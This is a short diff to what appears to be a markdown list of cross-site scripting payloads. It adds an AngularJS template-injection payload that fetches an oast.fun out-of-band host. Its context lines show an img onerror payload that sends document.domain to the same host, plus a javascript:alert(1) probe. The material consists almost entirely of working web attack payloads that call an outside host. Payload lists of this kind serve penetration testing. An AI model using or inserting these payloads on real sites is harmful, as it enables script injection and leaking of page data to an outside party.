@@ -46,6 +46,8 @@ javascript:alert(1)
 "></select><img src=1 onerror=document.location='http://tqppomndoggvfeiefwpdh4jb599h3e07m.oast.fun/?c='+document.domain;">
 ```
 
-
+```js
+{{constructor.constructor('fetch("https://tqppomndoggvfeiefwpdh4jb599h3e07m.oast.fun")')()}}
+```
 
 
